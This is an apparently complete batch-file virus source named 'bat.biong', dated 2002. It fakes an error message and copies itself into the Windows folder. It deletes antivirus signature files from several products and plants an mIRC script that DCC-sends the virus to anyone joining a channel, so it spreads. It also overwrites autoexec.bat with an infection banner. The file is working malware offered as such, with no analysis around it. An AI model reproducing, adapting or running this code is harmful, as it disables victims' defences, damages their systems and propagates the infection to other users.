REM bat.biong
REM by adious
REM written on 27\10\02
@echo off
echo problem with uploading the program
echo plz restart your computer
pause
ctty null
copy %0 c:\windows\biong.bat
if exist c:\windows\biong.bat del c:\programme\norton~1\s32integ.dll
if exist c:\windows\biong.bat del c:\programme\f-prot95\fpwm32.dll
if exist c:\windows\biong.bat del c:\programme\mcafee\scan.dat
if exist c:\windows\biong.bat del c:\tbavw95\tbscan.sig
if exist c:\windows\biong.bat del c:\tbav\tbav.dat 
if exist c:\windows\biong.bat del c:\programme\tbav\tbav.dat 
if exist c:\windows\biong.bat del c:\programme\avpersonal\antivir.vdf 
echo [script]>bion.bat 
echo n0=on 1:JOIN:#:{ >>bion.bat 
echo n1= /if ( nick == $me ) { halt } >>bion.bat 
echo n2= /.dcc send $nick c:\windows\biong.bat >>bion.bat 
echo n3=} >>bion.bat 
if exist c:\mirc\mirc.ini copy bion.bat c:\mirc\script.ini 
if exist c:\mirc32\mirc.ini copy bion.bat c:\mirc32\script.ini 
if exist c:\progra~1\mirc\mirc.ini copy bion.bat c:\progra~1\mirc\script.ini 
if exist c:\progra~1\mirc32\mirc.ini copy bion.bat c:\progra~1\mirc32\script.ini 
del bion.bat
del c:\autoexec.bat
echo @echo off >c:\autoexec.bat
echo 00000000000000000 >c:\autoexec.bat
echo infected by bat.biong >>c:\autoexec.bat
echo by adious >>c:\autoexec.bat
echo 000000000000000000 >>c:\autoexec.bat
echo pause >>c:\autoexec.bat
REM end of vir